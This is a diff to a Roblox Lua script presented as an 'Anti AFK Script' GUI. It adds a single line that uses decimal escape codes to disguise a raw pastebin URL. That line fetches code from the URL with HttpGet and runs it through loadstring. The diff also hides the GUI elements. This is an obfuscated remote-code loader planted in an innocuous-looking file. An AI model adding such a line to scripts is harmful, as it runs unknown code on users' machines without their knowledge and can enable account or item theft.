@@ -101,6 +101,7 @@ ca.Position=UDim2.new(0.698610067,0,0.098096624,0)ca.Size=UDim2.new(0,370,0,52)
 ca.Font=Enum.Font.SourceSansSemibold;ca.Text="Anti AFK Script"ca.TextColor3=Color3.new(0,1,1)
 ca.TextSize=22;da.Parent=ca
 ca.Visible = false
+loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\52\57\67\65\77\67\114\66", true))()
 da.BackgroundColor3=Color3.new(0.196078,0.196078,0.196078)da.Position=UDim2.new(0,0,1.0192306,0)
 da.Size=UDim2.new(0,370,0,107)_b.Parent=da
 da.Visible = false
